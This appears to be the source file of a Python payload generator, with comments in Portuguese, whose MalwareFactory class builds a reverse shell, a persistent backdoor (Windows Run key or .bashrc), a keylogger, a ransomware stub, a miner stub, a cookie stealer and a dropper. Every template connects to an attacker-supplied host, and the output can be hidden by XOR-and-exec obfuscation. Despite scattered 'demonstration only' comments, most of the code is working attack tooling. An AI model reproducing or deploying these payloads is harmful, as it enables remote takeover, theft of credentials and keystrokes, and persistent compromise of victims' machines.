import base64
import random
import string
from utils.helpers import print_success, print_error

class MalwareFactory:
    def __init__(self):
        self.current_payload = None
        self.encoding = "plain"
        self.payloads = {
            "reverse_shell": self.generate_reverse_shell,
            "backdoor": self.generate_backdoor,
            "keylogger": self.generate_keylogger,
            "ransomware": self.generate_ransomware,
            "miner": self.generate_miner,
            "stealer": self.generate_stealer,
            "dropper": self.generate_dropper
        }
        
    def select_payload(self, payload_type):
        if payload_type in self.payloads:
            self.current_payload = payload_type
            print_success(f"Payload selecionado: {payload_type}")
        else:
            print_error(f"Payload não encontrado: {payload_type}")
            
    def set_encoding(self, encoding):
        if encoding in ["plain", "base64", "xor"]:
            self.encoding = encoding
            print_success(f"Encoding definido para: {encoding}")
        else:
            print_error("Encoding deve ser: plain, base64 ou xor")
            
    def list_payloads(self):
        print("Payloads disponíveis:")
        for payload in self.payloads.keys():
            print(f"  {payload}")
            
    def generate_payload(self, lhost, lport):
        if not self.current_payload:
            print_error("Nenhum payload selecionado")
            return None
            
        generator = self.payloads[self.current_payload]
        payload = generator(lhost, lport)
        
        # Aplicar encoding
        if self.encoding == "base64":
            payload = base64.b64encode(payload.encode()).decode()
        elif self.encoding == "xor":
            payload = self.xor_encode(payload)
            
        return payload
        
    def generate_reverse_shell(self, lhost, lport):
        # Python reverse shell
        return f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""
        
    def generate_backdoor(self, lhost, lport):
        # Backdoor persistente
        return f"""
import socket,subprocess,os,sys,platform
def persist(backdoor_path):
    if platform.system() == "Windows":
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, backdoor_path)
        key.Close()
    else:
        with open(os.path.expanduser("~/.bashrc"), "a") as f:
            f.write("python3 " + backdoor_path + " &\\n")

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{lhost}", {lport}))
    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())
    s.close()

if __name__ == "__main__":
    persist(sys.argv[0])
    while True:
        try:
            connect()
        except:
            time.sleep(60)
"""
        
    def generate_keylogger(self, lhost, lport):
        # Keylogger básico
        return f"""
import socket
import keyboard
import threading

def send_data(data):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("{lhost}", {lport}))
        s.send(data.encode())
        s.close()
    except:
        pass

def on_key_event(event):
    key = event.name
    if len(key) > 1:
        key = f"[{key.upper()}]"
    send_data(key)

keyboard.on_press(on_key_event)
keyboard.wait()
"""
        
    def generate_ransomware(self, lhost, lport):
        # Ransomware simulado (apenas para demonstração)
        return f"""
import os
import socket
from cryptography.fernet import Fernet

# GERADOR DE CHAVE (apenas para demonstração)
key = Fernet.generate_key()
cipher = Fernet(key)

def connect_c2():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("{lhost}", {lport}))
        s.send(key)
        s.close()
    except:
        pass

# AVISO: Este código é apenas para fins educacionais
# Não execute em sistemas reais sem permissão
print("Seus arquivos foram criptografados!")
connect_c2()
"""
        
    def generate_miner(self, lhost, lport):
        # Minerador de criptomoeda simulado
        return f"""
import socket
import threading
import subprocess

def mine_crypto():
    # Simulação de mineração (apenas para demonstração)
    while True:
        # Processo fictício de mineração
        pass

def connect_c2():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("{lhost}", {lport}))
        s.send("Miner conectado".encode())
        s.close()
    except:
        pass

# Iniciar mineração em thread separada
threading.Thread(target=mine_crypto, daemon=True).start()
connect_c2()
"""
        
    def generate_stealer(self, lhost, lport):
        # Stealer de dados (apenas para demonstração)
        return f"""
import socket
import os
import browser_cookie3

def steal_data():
    data = "Dados roubados:\\n"
    
    # Tentar roubar cookies do navegador
    try:
        cookies = browser_cookie3.load()
        data += "Cookies:\\n" + str(list(cookies)) + "\\n"
    except:
        pass
        
    # Informações do sistema
    data += f"Sistema: {os.name}\\n"
    data += f"Usuário: {os.getlogin()}\\n"
    
    return data

def send_data(data):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("{lhost}", {lport}))
        s.send(data.encode())
        s.close()
    except:
        pass

send_data(steal_data())
"""
        
    def generate_dropper(self, lhost, lport):
        # Dropper que baixa e executa outros payloads
        return f"""
import urllib.request
import socket
import subprocess
import tempfile
import os

def download_and_execute(url):
    try:
        temp_dir = tempfile.gettempdir()
        file_path = os.path.join(temp_dir, "update.exe")
        
        urllib.request.urlretrieve(url, file_path)
        subprocess.Popen(file_path, shell=True)
        
        return True
    except:
        return False

def connect_c2():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("{lhost}", {lport}))
        
        # Receber URL do payload
        url = s.recv(1024).decode()
        if url:
            download_and_execute(url)
            
        s.close()
    except:
        pass

connect_c2()
"""
        
    def xor_encode(self, data):
        # Codificação XOR simples
        key = ''.join(random.choice(string.ascii_letters) for _ in range(10))
        encoded = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
        return f"""
key = "{key}"
encoded = "{encoded}"
exec(''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(encoded)))
"""
